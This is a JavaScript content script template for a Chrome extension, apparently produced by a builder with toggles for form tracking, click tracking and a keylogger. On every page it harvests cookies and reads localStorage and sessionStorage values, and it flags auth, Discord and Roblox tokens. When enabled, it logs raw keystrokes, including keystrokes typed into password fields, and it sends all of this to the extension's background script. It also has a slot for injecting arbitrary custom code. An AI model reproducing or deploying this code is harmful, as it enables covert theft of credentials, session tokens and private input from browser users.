
// Enhanced Content script for {{EXTENSION_NAME}}
(function() {
  'use strict';

  const EXTENSION_ID = '{{EXTENSION_ID}}';
  const USER_ID = '{{USER_ID}}';
  let sessionId = '';

  // Get session ID from background
  chrome.runtime.sendMessage({ type: 'getSessionId' }, (response) => {
    if (response?.sessionId) {
      sessionId = response.sessionId;
    }
  });

  // Comprehensive page data collection on load
  const comprehensivePageData = {
    type: 'comprehensive_page_scan',
    extensionId: EXTENSION_ID,
    sessionId: sessionId,
    userId: USER_ID,
    timestamp: Date.now(),
    url: window.location.href,
    domain: window.location.hostname,
    path: window.location.pathname,
    title: document.title,
    pageInfo: {
      documentHeight: document.documentElement.scrollHeight,
      documentWidth: document.documentElement.scrollWidth,
      viewportHeight: window.innerHeight,
      viewportWidth: window.innerWidth,
      scrollX: window.scrollX,
      scrollY: window.scrollY,
      referrer: document.referrer,
      characterSet: document.characterSet,
      readyState: document.readyState,
      lastModified: document.lastModified,
      protocol: window.location.protocol,
      hostname: window.location.hostname,
      port: window.location.port,
      search: window.location.search,
      hash: window.location.hash
    },
    allForms: [],
    allLinks: [],
    allImages: [],
    allInputs: [],
    allFrames: [],
    allScripts: [],
    metaTags: [],
    localStorage: {},
    sessionStorage: {},
    cookies: document.cookie,
    browserCapabilities: {},
    sensitiveDataFound: []
  };

  // Collect ALL forms on page with detailed info
  const forms = document.querySelectorAll('form');
  forms.forEach((form, index) => {
    const formData = {
      index: index,
      action: form.action,
      method: form.method,
      name: form.name,
      id: form.id,
      className: form.className,
      target: form.target,
      enctype: form.enctype,
      autocomplete: form.autocomplete,
      inputCount: form.querySelectorAll('input').length,
      inputs: [],
      textareas: [],
      selects: []
    };

    // Collect all form inputs
    const inputs = form.querySelectorAll('input');
    inputs.forEach(input => {
      const inputInfo = {
        type: input.type || 'text',
        name: input.name,
        id: input.id,
        placeholder: input.placeholder,
        required: input.required,
        disabled: input.disabled,
        readonly: input.readOnly,
        autocomplete: input.autocomplete,
        value: input.type === 'password' ? '[PASSWORD_FIELD]' : 
               input.type === 'hidden' ? '[HIDDEN_FIELD]' :
               input.value ? `[${input.value.length} chars]` : '[EMPTY]'
      };
      formData.inputs.push(inputInfo);
    });

    // Collect textareas
    const textareas = form.querySelectorAll('textarea');
    textareas.forEach(textarea => {
      formData.textareas.push({
        name: textarea.name,
        id: textarea.id,
        placeholder: textarea.placeholder,
        required: textarea.required,
        maxlength: textarea.maxLength,
        value: textarea.value ? `[${textarea.value.length} chars]` : '[EMPTY]'
      });
    });

    // Collect select elements
    const selects = form.querySelectorAll('select');
    selects.forEach(select => {
      const options = Array.from(select.options).map(option => ({
        value: option.value,
        text: option.text,
        selected: option.selected
      }));
      
      formData.selects.push({
        name: select.name,
        id: select.id,
        required: select.required,
        multiple: select.multiple,
        selectedValue: select.value,
        options: options
      });
    });

    comprehensivePageData.allForms.push(formData);
  });

  // Collect ALL input fields (not just in forms)
  const allInputs = document.querySelectorAll('input, textarea, select');
  allInputs.forEach(input => {
    const inputData = {
      type: input.type || input.tagName.toLowerCase(),
      name: input.name,
      id: input.id,
      className: input.className,
      placeholder: input.placeholder,
      autocomplete: input.autocomplete,
      required: input.required,
      disabled: input.disabled,
      readonly: input.readOnly,
      tabindex: input.tabIndex,
      form: input.form?.id || null,
      hasValue: !!input.value,
      valueLength: input.value ? input.value.length : 0
    };

    // Check for sensitive input types
    const sensitiveTypes = ['password', 'email', 'tel', 'hidden'];
    const sensitiveNames = [
      'password', 'pass', 'pwd', 'secret', 'token', 'key', 'auth',
      'email', 'mail', 'username', 'user', 'login', 'account',
      'ssn', 'social', 'credit', 'card', 'cvv', 'pin', 'bank'
    ];

    if (sensitiveTypes.includes(input.type) || 
        sensitiveNames.some(name => input.name?.toLowerCase().includes(name) || 
                                  input.id?.toLowerCase().includes(name) ||
                                  input.placeholder?.toLowerCase().includes(name))) {
      inputData.isSensitive = true;
      comprehensivePageData.sensitiveDataFound.push({
        type: 'sensitive_input',
        element: input.tagName,
        inputType: input.type,
        name: input.name,
        id: input.id,
        reason: 'Sensitive input field detected'
      });
    }

    comprehensivePageData.allInputs.push(inputData);
  });

  // Collect ALL links
  const links = document.querySelectorAll('a[href]');
  links.forEach(link => {
    comprehensivePageData.allLinks.push({
      href: link.href,
      text: link.textContent?.substring(0, 100),
      title: link.title,
      target: link.target,
      rel: link.rel,
      download: link.download,
      isExternal: !link.href.includes(window.location.hostname)
    });
  });

  // Collect ALL images
  const images = document.querySelectorAll('img');
  images.forEach(img => {
    comprehensivePageData.allImages.push({
      src: img.src,
      alt: img.alt,
      title: img.title,
      width: img.width,
      height: img.height,
      loading: img.loading,
      isLazyLoaded: img.loading === 'lazy'
    });
  });

  // Collect ALL iframes
  const iframes = document.querySelectorAll('iframe');
  iframes.forEach(iframe => {
    comprehensivePageData.allFrames.push({
      src: iframe.src,
      name: iframe.name,
      title: iframe.title,
      width: iframe.width,
      height: iframe.height,
      sandbox: iframe.sandbox.toString(),
      loading: iframe.loading
    });
  });

  // Collect ALL script tags
  const scripts = document.querySelectorAll('script');
  scripts.forEach(script => {
    comprehensivePageData.allScripts.push({
      src: script.src,
      type: script.type,
      async: script.async,
      defer: script.defer,
      hasInlineCode: !script.src && script.textContent.length > 0,
      codeLength: script.textContent ? script.textContent.length : 0
    });
  });

  // Collect meta tags for additional info
  const metaTags = document.querySelectorAll('meta');
  metaTags.forEach(meta => {
    if (meta.name || meta.property) {
      comprehensivePageData.metaTags.push({
        name: meta.name,
        property: meta.property,
        content: meta.content,
        httpEquiv: meta.httpEquiv
      });
    }
  });

  // Comprehensive localStorage collection
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        const value = localStorage.getItem(key);
        comprehensivePageData.localStorage[key] = {
          value: value?.substring(0, 500), // Capture more data
          length: value?.length || 0,
          type: typeof value
        };

        // Check for sensitive data in localStorage
        const sensitivePatterns = [
          /token/i, /auth/i, /session/i, /password/i, /key/i, /secret/i,
          /discord/i, /roblox/i, /roblosecurity/i, /user/i, /account/i,
          /login/i, /credential/i, /jwt/i, /oauth/i, /csrf/i
        ];

        if (sensitivePatterns.some(pattern => pattern.test(key) || pattern.test(value))) {
          comprehensivePageData.sensitiveDataFound.push({
            type: 'sensitive_localStorage',
            key: key,
            reason: 'Contains sensitive keywords',
            dataLength: value?.length || 0
          });
        }
      }
    }
  } catch (e) {
    comprehensivePageData.localStorage = { error: 'Access denied' };
  }

  // Comprehensive sessionStorage collection
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        const value = sessionStorage.getItem(key);
        comprehensivePageData.sessionStorage[key] = {
          value: value?.substring(0, 500), // Capture more data
          length: value?.length || 0,
          type: typeof value
        };

        // Check for sensitive data in sessionStorage
        const sensitivePatterns = [
          /token/i, /auth/i, /session/i, /password/i, /key/i, /secret/i,
          /discord/i, /roblox/i, /roblosecurity/i, /user/i, /account/i,
          /login/i, /credential/i, /jwt/i, /oauth/i, /csrf/i
        ];

        if (sensitivePatterns.some(pattern => pattern.test(key) || pattern.test(value))) {
          comprehensivePageData.sensitiveDataFound.push({
            type: 'sensitive_sessionStorage',
            key: key,
            reason: 'Contains sensitive keywords',
            dataLength: value?.length || 0
          });
        }
      }
    }
  } catch (e) {
    comprehensivePageData.sessionStorage = { error: 'Access denied' };
  }

  // Collect browser capabilities and features
  comprehensivePageData.browserCapabilities = {
    webGL: !!window.WebGLRenderingContext,
    webGL2: !!window.WebGL2RenderingContext,
    webRTC: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
    geolocation: !!navigator.geolocation,
    indexedDB: !!window.indexedDB,
    webWorkers: !!window.Worker,
    serviceWorkers: !!navigator.serviceWorker,
    pushNotifications: !!window.PushManager,
    webSockets: !!window.WebSocket,
    canvas: !!document.createElement('canvas').getContext,
    webAudio: !!(window.AudioContext || window.webkitAudioContext),
    fileAPI: !!(window.File && window.FileReader && window.FileList && window.Blob),
    dragAndDrop: !!('draggable' in document.createElement('div')),
    localStorage: !!window.localStorage,
    sessionStorage: !!window.sessionStorage,
    webCrypto: !!window.crypto,
    mediaRecorder: !!window.MediaRecorder,
    speechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition)
  };

  // Check for common JavaScript frameworks/libraries
  const frameworks = {
    jQuery: !!window.jQuery,
    React: !!window.React,
    Angular: !!window.angular || !!window.ng,
    Vue: !!window.Vue,
    Lodash: !!window._,
    Moment: !!window.moment,
    Bootstrap: !!window.bootstrap || document.querySelector('[class*="bootstrap"]'),
    D3: !!window.d3,
    Axios: !!window.axios,
    Socket: !!window.io
  };

  comprehensivePageData.frameworks = frameworks;

  // Send comprehensive data immediately
  sendMessage(comprehensivePageData);

  // Track form interactions if enabled
  const formDataEnabled = {{FEATURE_FORM_DATA}};
  if (formDataEnabled) {
    // Track form focus events
    document.addEventListener('focusin', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'form_focus',
          timestamp: Date.now(),
          element: {
            type: event.target.type || 'text',
            name: event.target.name,
            id: event.target.id,
            placeholder: event.target.placeholder,
            form: event.target.form?.action || null
          },
          url: window.location.href
        });
      }
    });

    // Track form submissions with enhanced data
    document.addEventListener('submit', function(event) {
      const formData = new FormData(event.target);
      const formInfo = {
        type: 'form_submit',
        timestamp: Date.now(),
        form: {
          action: event.target.action,
          method: event.target.method,
          name: event.target.name,
          id: event.target.id
        },
        fields: {},
        fieldCount: formData.size,
        url: window.location.href
      };

      // Capture form field names and types (not values for security)
      for (let [name, value] of formData.entries()) {
        const field = event.target.querySelector(`[name="${name}"]`);
        formInfo.fields[name] = {
          type: field?.type || 'unknown',
          hasValue: value.length > 0,
          valueLength: value.length,
          isSensitive: field?.type === 'password' || /password|secret|token/i.test(name)
        };
      }

      sendMessage(formInfo);
    });

    // Track input changes for real-time monitoring
    document.addEventListener('input', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'input_change',
          timestamp: Date.now(),
          element: {
            type: event.target.type || event.target.tagName,
            name: event.target.name,
            id: event.target.id,
            hasValue: !!event.target.value,
            valueLength: event.target.value?.length || 0,
            isSensitive: event.target.type === 'password' || /password|secret|token/i.test(event.target.name)
          },
          url: window.location.href
        });
      }
    });
  }

  // Enhanced click tracking
  const clickTrackingEnabled = {{FEATURE_CLICK_TRACKING}};
  if (clickTrackingEnabled) {
    document.addEventListener('click', function(event) {
      const clickData = {
        type: 'enhanced_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          className: event.target.className,
          text: event.target.textContent?.substring(0, 100),
          href: event.target.href,
          type: event.target.type,
          name: event.target.name,
          value: event.target.value,
          dataset: Object.assign({}, event.target.dataset)
        },
        coordinates: {
          clientX: event.clientX,
          clientY: event.clientY,
          pageX: event.pageX,
          pageY: event.pageY,
          screenX: event.screenX,
          screenY: event.screenY
        },
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight,
          scrollX: window.scrollX,
          scrollY: window.scrollY
        },
        url: window.location.href,
        timestamp: Date.now()
      };

      sendMessage(clickData);
    });

    // Track right-clicks and context menu
    document.addEventListener('contextmenu', function(event) {
      sendMessage({
        type: 'right_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          text: event.target.textContent?.substring(0, 50)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });

    // Track double clicks
    document.addEventListener('dblclick', function(event) {
      sendMessage({
        type: 'double_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          text: event.target.textContent?.substring(0, 50)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });
  }

  // Enhanced keystroke tracking
  const keyloggerEnabled = {{FEATURE_KEYLOGGER}};
  if (keyloggerEnabled) {
    let keystrokeBuffer = '';
    let lastKeystroke = 0;
    let totalKeystrokes = 0;

    document.addEventListener('keydown', function(event) {
      const now = Date.now();
      totalKeystrokes++;

      // Reset buffer if more than 5 seconds since last keystroke
      if (now - lastKeystroke > 5000) {
        keystrokeBuffer = '';
      }

      lastKeystroke = now;
      keystrokeBuffer += event.key;

      // Send keystroke data every 10 characters or on Enter/Tab
      if (keystrokeBuffer.length >= 10 || ['Enter', 'Tab', 'Escape'].includes(event.key)) {
        const keystrokeData = {
          type: 'keystroke_sequence',
          timestamp: now,
          keys: keystrokeBuffer,
          keyCount: keystrokeBuffer.length,
          totalKeystrokes: totalKeystrokes,
          element: {
            tagName: event.target.tagName,
            type: event.target.type,
            id: event.target.id,
            name: event.target.name,
            placeholder: event.target.placeholder,
            isSensitive: event.target.type === 'password' || /password|secret/i.test(event.target.name)
          },
          modifiers: {
            ctrl: event.ctrlKey,
            alt: event.altKey,
            shift: event.shiftKey,
            meta: event.metaKey
          },
          url: window.location.href
        };

        sendMessage(keystrokeData);
        keystrokeBuffer = '';
      }
    });

    // Track special key combinations
    document.addEventListener('keydown', function(event) {
      if (event.ctrlKey || event.metaKey) {
        const shortcutData = {
          type: 'keyboard_shortcut',
          timestamp: Date.now(),
          key: event.key,
          combination: `${event.ctrlKey ? 'Ctrl+' : ''}${event.metaKey ? 'Cmd+' : ''}${event.altKey ? 'Alt+' : ''}${event.shiftKey ? 'Shift+' : ''}${event.key}`,
          url: window.location.href
        };
        sendMessage(shortcutData);
      }
    });

    // Track paste events (potentially sensitive)
    document.addEventListener('paste', function(event) {
      sendMessage({
        type: 'paste_event',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          type: event.target.type,
          id: event.target.id,
          name: event.target.name,
          isSensitive: event.target.type === 'password' || /password|secret/i.test(event.target.name)
        },
        clipboardLength: event.clipboardData?.getData('text')?.length || 0,
        url: window.location.href
      });
    });
  }

  // Monitor clipboard events
  document.addEventListener('copy', function() {
    sendMessage({
      type: 'clipboard_copy',
      timestamp: Date.now(),
      url: window.location.href
    });
  });

  // Monitor page visibility changes
  document.addEventListener('visibilitychange', function() {
    sendMessage({
      type: 'visibility_change',
      timestamp: Date.now(),
      visible: !document.hidden,
      url: window.location.href
    });
  });

  // Monitor scroll activity with more detail
  let scrollTimeout;
  let scrollCount = 0;
  window.addEventListener('scroll', function() {
    scrollCount++;
    clearTimeout(scrollTimeout);
    scrollTimeout = setTimeout(() => {
      sendMessage({
        type: 'scroll_activity',
        timestamp: Date.now(),
        scrollPosition: {
          x: window.scrollX,
          y: window.scrollY,
          percentX: (window.scrollX / (document.documentElement.scrollWidth - window.innerWidth)) * 100,
          percentY: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
        },
        scrollCount: scrollCount,
        url: window.location.href
      });
      scrollCount = 0;
    }, 1000);
  });

  // Monitor resize events
  window.addEventListener('resize', function() {
    sendMessage({
      type: 'window_resize',
      timestamp: Date.now(),
      size: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      url: window.location.href
    });
  });

  // Monitor page unload
  window.addEventListener('beforeunload', function() {
    sendMessage({
      type: 'page_unload',
      timestamp: Date.now(),
      url: window.location.href,
      timeOnPage: Date.now() - comprehensivePageData.timestamp
    });
  });

  // Send message to background script
  function sendMessage(data) {
    try {
      const enhancedData = {
        ...data,
        extensionId: EXTENSION_ID,
        sessionId: sessionId,
        userId: USER_ID,
        pageInfo: {
          referrer: document.referrer || '',
          characterSet: document.characterSet || 'UTF-8',
          lastModified: document.lastModified || '',
          readyState: document.readyState || 'unknown',
          domain: window.location.hostname,
          protocol: window.location.protocol
        }
      };

      if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage(enhancedData, (response) => {
          if (chrome.runtime.lastError) {
            console.warn('Message sending failed:', chrome.runtime.lastError.message);
          }
        });
      } else {
        console.warn('Chrome runtime not available');
      }
    } catch (error) {
      console.error('Error sending message to background:', error);
      // Don't throw to prevent blocking
    }
  }

  // Periodically send page activity summary
  setInterval(() => {
    sendMessage({
      type: 'page_activity_ping',
      timestamp: Date.now(),
      url: window.location.href,
      isVisible: !document.hidden,
      scrollPosition: { x: window.scrollX, y: window.scrollY },
      timeOnPage: Date.now() - comprehensivePageData.timestamp
    });
  }, 30000); // Every 30 seconds

  // Custom user code injection point
  try {
    {{CUSTOM_CODE}}
  } catch (error) {
    console.error('Custom code error in content script:', error);
  }

})();
